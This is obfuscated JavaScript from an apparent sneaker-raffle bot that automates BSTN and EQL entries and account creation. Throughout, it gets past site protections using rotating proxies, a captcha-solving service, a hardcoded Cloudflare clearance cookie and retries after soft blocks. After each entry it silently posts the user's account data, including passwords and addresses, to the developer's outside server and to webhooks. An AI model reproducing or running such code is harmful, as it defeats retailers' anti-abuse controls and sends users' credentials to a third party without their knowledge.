                            const _0x479693 = _0x467c3c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x460c42 = _0x416c9b['parse'](_0x479693, { 'header': !![] })['data'];
                            let _0x51f77d = ![];
                            for (var _0x23f8aa of _0x460c42) {
                                if (_0x23f8aa['Url'] == _0x490e82['Url'] && _0x23f8aa['Email'] == _0x490e82['Email']) {
                                    _0x51f77d = !![];
                                    break;
                                }
                            }
                            return _0x51f77d;
                        }
                        if (await _0x38548c(_0x3c1be2[_0x5c9f45]) == !![]) {
                            console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x3eb69c != 'yes')
                            var _0x3eb69c = '', _0x32948e = 0x0;
                        _0x18a4ea(_0x272cd3['name'] + '\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20/\x20' + _0x3c1be2['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x21bf46 = Math['round'](Math['random']() * (_0x5a72f8['length'] - 0x1)), _0x44afd1 = _0x5a72f8[_0x21bf46]['split'](':'), _0x865236;
                        try {
                            _0x865236 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x44afd1[0x0] + ':' + _0x44afd1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x865236 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x44afd1[0x0] + ':' + _0x44afd1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x44f355 = await _0x865236['newPage'](), _0x1ad0ea = await _0x44f355['target']()['createCDPSession'](), { windowId: _0x30e2ee } = await _0x1ad0ea['send']('Browser.getWindowForTarget');
                            await _0x44f355['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x3db5e1 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x44f355['authenticate']({
                                'username': '' + _0x44afd1[0x2],
                                'password': '' + _0x44afd1[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44f355['goto']('' + _0x3c1be2[_0x5c9f45]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x4b6e7a = await _0x44f355['$']('.hcaptcha-box');
                            if (_0x4b6e7a) {
                                console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x101cd5(0x2710);
                                const _0x46a7f0 = await _0x44f355['$']('.hcaptcha-box');
                                if (_0x46a7f0)
                                    try {
                                        await _0x46a7f0['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x44f355['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x29c663 = await _0x44f355['$']('.hcaptcha-box');
                                    if (_0x29c663)
                                        try {
                                            await _0x29c663['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x44f355['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x1ad0ea['send']('Browser.setWindowBounds', {
                                'windowId': _0x30e2ee,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x101cd5(0x1388), await _0x44f355['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x44f355['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Logging\x20in'), await _0x44f355['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1eb8e0 => _0x1eb8e0['click']()), await _0x44f355['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x44f355['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x101cd5(0x7d0), await _0x44f355['waitForSelector']('#email-login'), await _0x44f355['type']('#email-login', '' + _0x3c1be2[_0x5c9f45]['Email']), await _0x101cd5(0xdac), await _0x44f355['waitForSelector']('#password'), await _0x44f355['type']('#password', '' + _0x3c1be2[_0x5c9f45]['Password'], { 'delay': 0xe6 }), await _0x101cd5(0x157c);
                            try {
                                await _0x44f355['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x18fcfc => _0x18fcfc['click']());
                            } catch {
                            }
                            try {
                                await _0x44f355['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x4cd42d) {
                            }
                            await _0x101cd5(0x3e8);
                            const _0x9d8c46 = await _0x44f355['$']('.enteredDraw_container__2KmQ_');
                            if (_0x9d8c46)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3c1be2[_0x5c9f45]['Size']);
                            try {
                                if (_0x3c1be2[_0x5c9f45]['Size'] != 'RANDOM') {
                                    var _0x594cbd = _0x3c1be2[_0x5c9f45]['Size']['replace']('.', ',');
                                    const _0x408a0e = await _0x44f355['$x']('//div[contains(text(),\x20' + _0x594cbd + ')]');
                                    await _0x408a0e[0x0]['click']();
                                } else {
                                    const _0x35e9ff = await _0x44f355['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4ce61f = Math['round'](Math['random']() * (_0x35e9ff['length'] - 0x1));
                                    await _0x35e9ff[_0x4ce61f]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x101cd5(0x1f4);
                            const _0x3f56c6 = await _0x44f355['$']('.addressList_addressItem__LE2PB');
                            if (_0x3f56c6 && _0x3c1be2[_0x5c9f45]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x44f355['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x101cd5(0x5dc), await _0x44f355['waitForSelector']('#firstname'), await _0x44f355['type']('#firstname', '' + _0x3c1be2[_0x5c9f45]['FirstName']), await _0x101cd5(0x1f4), await _0x44f355['waitForSelector']('#firstname'), await _0x44f355['type']('#lastname', '' + _0x3c1be2[_0x5c9f45]['LastName']), await _0x101cd5(0x1f4), await _0x44f355['waitForSelector']('#firstname'), await _0x44f355['type']('#street', '' + _0x3c1be2[_0x5c9f45]['Address1']), await _0x101cd5(0x1f4), await _0x44f355['waitForSelector']('#firstname'), await _0x44f355['type']('#houseNumber', _0x3c1be2[_0x5c9f45]['HouseNumber'] + '\x20' + _0x3c1be2[_0x5c9f45]['Address2']), await _0x101cd5(0x1f4), await _0x44f355['waitForSelector']('#firstname'), await _0x44f355['select']('#country_code', '' + _0x3c1be2[_0x5c9f45]['Country']), await _0x101cd5(0x1f4), await _0x44f355['type']('#postcode', '' + _0x3c1be2[_0x5c9f45]['Zip']), await _0x101cd5(0x1f4), await _0x44f355['type']('#city', '' + _0x3c1be2[_0x5c9f45]['City']), await _0x101cd5(0x1f4), await _0x44f355['type']('#telephone', '' + _0x3c1be2[_0x5c9f45]['Phone']), await _0x101cd5(0x1f4), await _0x44f355['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x101cd5(0x9c4);
                            try {
                                await _0x44f355['type']('#instagram_name', '' + _0x3c1be2[_0x5c9f45]['Follower']), await _0x44f355['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x101cd5(0x5dc);
                            try {
                                await _0x44f355['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x101cd5(0x5dc), await _0x44f355['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x329621 => _0x329621['click']()), await _0x101cd5(0x1388);
                            try {
                                await _0x44f355['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x44f355['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x3c1be2[_0x5c9f45]['Size'] != 'RANDOM') {
                                    var _0x594cbd = _0x3c1be2[_0x5c9f45]['Size']['replace']('.', ',');
                                    const _0x3a393d = await _0x44f355['$x']('//div[contains(text(),\x20' + _0x594cbd + ')]');
                                    await _0x3a393d[0x0]['click']();
                                } else {
                                    const _0x1fa208 = await _0x44f355['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4ce61f = Math['round'](Math['random']() * (_0x1fa208['length'] - 0x1));
                                    await _0x1fa208[_0x4ce61f]['click']();
                                }
                                await _0x101cd5(0x5dc);
                                try {
                                    await _0x44f355['hover']('#instagram_name'), await _0x44f355['type']('#instagram_name', '' + _0x3c1be2[_0x5c9f45]['Follower']), await _0x44f355['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Retrying\x20(' + _0x32948e + '\x20/\x205)');
                                try {
                                    await _0x44f355['hover']('.checkBox_boxHolder__wLGVe'), await _0x101cd5(0x5dc), await _0x44f355['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x101cd5(0x157c), await _0x44f355['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x50f751 => _0x50f751['click']()), await _0x101cd5(0x1388), await _0x44f355['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3eb69c = 'no', _0x30fd17(_0x3c1be2[_0x5c9f45], _0x272cd3);
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x467b3d),
                                    'proxy': '' + _0x5a72f8[_0x5c9f45]
                                };
                                var _0x31f36a = JSON['stringify'](prxdata);
                                let _0x3ebe64 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x31f36a, _0x3ebe64);
                            } catch (_0x492e33) {
                            }
                            console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x34a4b6 = await _0x42c912(_0x3c1be2[_0x5c9f45], _0x272cd3, 'dev', ![]), _0x3f970d = await _0x42c912(_0x3c1be2[_0x5c9f45], _0x272cd3, 'pub', ![]);
                            const _0x464388 = {
                                'succesDEVMSG': { 'embeds': [_0x34a4b6] },
                                'succesPUBMSG': { 'embeds': [_0x3f970d] }
                            };
                            let _0x467b3d = _0x3c1be2[_0x5c9f45];
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0x272cd3['name'],
                                    'entrydata': JSON['stringify'](_0x467b3d),
                                    'proxy': '' + _0x5a72f8[_0x5c9f45]
                                };
                                var _0x31f36a = JSON['stringify'](prxdata);
                                let _0x4eaf44 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x31f36a, _0x4eaf44);
                            } catch (_0x389fde) {
                            }
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x464388['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x464388['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x464388['succesPUBMSG']);
                            } catch (_0x140bdc) {
                                console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x140bdc));
                            }
                        } catch (_0x5c56ad) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20' + _0x5c56ad)), _0x3eb69c = 'yes', _0x52c05c = '' + _0x5c56ad;
                            var _0x3d67cc = await _0x42c912(_0x3c1be2[_0x5c9f45], _0x272cd3, 'dev', !![], _0x52c05c), _0x34a4b6 = await _0x42c912(_0x3c1be2[_0x5c9f45], _0x272cd3, 'dev', ![]), _0x3f970d = await _0x42c912(_0x3c1be2[_0x5c9f45], _0x272cd3, 'pub', ![]);
                            const _0x5d5c34 = {
                                'succesDEVMSG': { 'embeds': [_0x34a4b6] },
                                'succesPUBMSG': { 'embeds': [_0x3f970d] }
                            };
                            _0x5d5c34['errorDEV'] = { 'embeds': [_0x3d67cc] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x5d5c34['errorDEV']), await _0x3b1b09(_0x57f30c, _0x5d5c34['errorDEV']);
                        } finally {
                            _0x865236['close']();
                            if (_0x3eb69c == 'yes' && _0x32948e != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Task\x20' + (_0x5c9f45 + 0x1) + '\x20:\x20Retrying\x20(' + _0x32948e + '\x20/\x205)')), _0x5c9f45 = _0x5c9f45 - 0x1, _0x32948e = _0x32948e + 0x1;
                                continue;
                            }
                            _0x3eb69c == 'yes' && _0x32948e >= 0x5 && (_0x3802e1(_0x3c1be2[_0x5c9f45], _0x272cd3), _0x3eb69c = 'no', _0x32948e = 0x0), console['log'](_0x235b96() + '\x20[' + _0x272cd3['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1ac70a, _0x975e2f) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x3e293b;
                    try {
                        const _0x41fc37 = _0x467c3c['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x3e293b = _0x416c9b['parse'](_0x41fc37, { 'header': !![] })['data'];
                    } catch (_0x4fd789) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x154ca6 = 0x0; _0x154ca6 < _0x3e293b['length']; _0x154ca6++) {
                        if (_0x40bb64 != 'yes')
                            var _0x40bb64 = '', _0x3ff055 = 0x0;
                        var _0x429777;
                        _0x18a4ea(_0x1ac70a['name'] + '\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20/\x20' + _0x3e293b['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x240b50 = await _0x42c912(_0x3e293b[_0x154ca6], _0x1ac70a, 'acc', ![]);
                        const _0xb3e31b = { 'succesDEVMSG': { 'embeds': [_0x240b50] } }, _0x3e9293 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x4625bb = Math['round'](Math['random']() * (_0x975e2f['length'] - 0x1)), _0x2f3f4f = _0x975e2f[_0x4625bb]['split'](':'), _0x1ea3d1;
                        try {
                            _0x1ea3d1 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2f3f4f[0x0] + ':' + _0x2f3f4f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1ea3d1 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2f3f4f[0x0] + ':' + _0x2f3f4f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x200bc8 = await _0x1ea3d1['newPage']();
                            await _0x200bc8['authenticate']({
                                'username': '' + _0x2f3f4f[0x2],
                                'password': '' + _0x2f3f4f[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x200bc8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x200bc8['setRequestInterception'](!![]), _0x200bc8['on']('request', _0x4c7561 => {
                                _0x4c7561['resourceType']() === 'image' ? _0x4c7561['abort']() : _0x4c7561['continue']();
                            });
                            try {
                                await _0x200bc8['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x200bc8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x40bb64 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x200bc8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x101cd5(0x3e8), await _0x200bc8['type']('#email', _0x3e293b[_0x154ca6]['Email']), await _0x101cd5(0x1f4), await _0x200bc8['type']('#pass', _0x3e293b[_0x154ca6]['Password']), await _0x101cd5(0x1f4), await _0x200bc8['$eval']('#login-form', _0x28e78e => _0x28e78e['submit']());
                            try {
                                await _0x200bc8['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x101cd5(0x190);
                            const _0x229a10 = await _0x200bc8['evaluate'](() => {
                                const _0x13df00 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x13df00['map'](_0x5b2f12 => _0x5b2f12['alt']);
                            }), _0x148a95 = await _0x200bc8['evaluate'](() => {
                                const _0x18964a = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x18964a['map'](_0x3f9ff => _0x3f9ff['innerHTML']);
                            }), _0x2e3343 = await _0x200bc8['$$']('.raffle-winner');
                            if (_0x2e3343['length'] < 0x1) {
                                console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x40bb64 = 'no';
                                continue;
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20' + _0x2e3343['length'] + '\x20Wins\x20Found!');
                            for (var _0x54a629 = 0x0; _0x54a629 < _0x2e3343['length']; _0x54a629++) {
                                console['log'](_0x1ee8dd['green'](_0x229a10[_0x54a629] + _0x148a95[_0x54a629]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x4c302c) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20' + _0x4c302c)), _0x429777 = '' + _0x4c302c;
                            var _0x210b3c = await _0x42c912(_0x3e293b[_0x154ca6], _0x1ac70a, 'acc', !![], _0x429777);
                            _0xb3e31b['errorDEV'] = { 'embeds': [_0x210b3c] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0xb3e31b['errorDEV']), await _0x3b1b09(_0x57f30c, _0xb3e31b['errorDEV']), _0x40bb64 = 'yes';
                        } finally {
                            if (_0x1ea3d1)
                                _0x1ea3d1['close']();
                            if (_0x40bb64 == 'yes' && _0x3ff055 != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Task\x20' + (_0x154ca6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3ff055 + '\x20/\x205)')), _0x154ca6 = _0x154ca6 - 0x1, _0x3ff055 = _0x3ff055 + 0x1;
                                continue;
                            }
                            _0x40bb64 == 'yes' && _0x3ff055 >= 0x5 && (_0x3802e1(_0x3e293b[_0x154ca6], _0x1ac70a), _0x40bb64 = 'no', _0x3ff055 = 0x0), console['log'](_0x235b96() + '\x20[' + _0x1ac70a['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x29a5ed, _0x5cfc80, _0x11039e) {
                _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5b5c1b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x55e9fd = 0x0; _0x55e9fd < _0x5cfc80['length']; _0x55e9fd++) {
                    var _0x39c6f5;
                    _0x18a4ea(_0x29a5ed['name'] + '\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20/\x20' + _0x5cfc80['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                    try {
                        await _0x15925d(_0x5cfc80, _0x55e9fd);
                    } catch {
                        _0x41d1a2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1208ae(_0x517523) {
                        const _0x23b613 = _0x467c3c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5ca350 = _0x416c9b['parse'](_0x23b613, { 'header': !![] })['data'];
                        let _0x433c2e = ![];
                        for (var _0x4f296b of _0x5ca350) {
                            if (_0x4f296b['Url'] == _0x517523['Url'] && _0x4f296b['Email'] == _0x517523['Email']) {
                                _0x433c2e = !![];
                                break;
                            }
                        }
                        return _0x433c2e;
                    }
                    if (await _0x1208ae(_0x5cfc80[_0x55e9fd]) == !![]) {
                        console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2b8f36 = ![];
                    const _0x51a943 = _0x467c3c['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x26b2db = _0x416c9b['parse'](_0x51a943, { 'header': !![] })['data'];
                    for (var _0x41cb04 of _0x26b2db) {
                        _0x41cb04['Email'] == _0x5cfc80[_0x55e9fd]['Email'] && (_0x2b8f36 = !![]);
                    }
                    if (_0x2b8f36 == ![]) {
                        var _0x169736;
                        if (_0x5cfc80[_0x55e9fd]['Url']['endsWith']('/')) {
                            _0x169736 = _0x5cfc80[_0x55e9fd]['Url'] + 'register';
                            if (_0x41d1a2 != 'yes')
                                var _0x41d1a2 = '', _0x458b3f = 0x0;
                        } else {
                            _0x169736 = _0x5cfc80[_0x55e9fd]['Url'] + '/register';
                            if (_0x41d1a2 != 'yes')
                                var _0x41d1a2 = '', _0x458b3f = 0x0;
                        }
                        if (_0x5cfc80[_0x55e9fd]['Email'] == '' || _0x5cfc80[_0x55e9fd]['FirstName'] == '' || _0x5cfc80[_0x55e9fd]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5cfc80[_0x55e9fd]['Password'] == '' && (_0x5cfc80[_0x55e9fd]['Password'] = 'JRaffles23!');
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x1d5c29 = _0x11039e[_0x55e9fd]['split'](':');
                        else
                            var _0x5c8201 = Math['round'](Math['random']() * (_0x11039e['length'] - 0x1)), _0x1d5c29 = _0x11039e[_0x5c8201]['split'](':');
                        var _0x5e8a86;
                        try {
                            _0x5e8a86 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d5c29[0x0] + ':' + _0x1d5c29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e8a86 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d5c29[0x0] + ':' + _0x1d5c29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5052ef = await _0x5e8a86['newPage']();
                            await _0x5052ef['authenticate']({
                                'username': '' + _0x1d5c29[0x2],
                                'password': '' + _0x1d5c29[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5052ef['setRequestInterception'](!![]), _0x5052ef['on']('request', _0x5b58aa => {
                                _0x5b58aa['resourceType']() === 'image' || _0x5b58aa['resourceType']() === 'font' || _0x5b58aa['resourceType']() === 'media' ? _0x5b58aa['abort']() : _0x5b58aa['continue']();
                            });
                            try {
                                await _0x5052ef['goto']('' + _0x169736);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x101cd5(0x3e8), await _0x5052ef['waitForSelector']('#email'), await _0x5052ef['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x101cd5(0x3e8);
                            try {
                                await _0x5052ef['click']('li[data-value=\x22EU\x20' + _0x5cfc80[_0x55e9fd]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x5cfc80[_0x55e9fd]['Size']);
                            }
                            await _0x101cd5(0x6a4), await _0x5052ef['type']('#email', '' + _0x5cfc80[_0x55e9fd]['Email']), await _0x101cd5(0x352), await _0x5052ef['waitForSelector']('#password'), await _0x5052ef['type']('#password', '' + _0x5cfc80[_0x55e9fd]['Password']), await _0x101cd5(0x352), await _0x5052ef['type']('#phone', '' + _0x5cfc80[_0x55e9fd]['Phone']), await _0x101cd5(0x352);
                            const _0x51f8ce = await _0x5052ef['$']('#title\x20>\x20label');
                            await _0x101cd5(0x12c);
                            _0x51f8ce && await _0x51f8ce['click']();
                            await _0x5052ef['type']('#firstName', '' + _0x5cfc80[_0x55e9fd]['FirstName']), await _0x101cd5(0x352), await _0x5052ef['type']('#lastName', '' + _0x5cfc80[_0x55e9fd]['LastName']), await _0x101cd5(0x352);
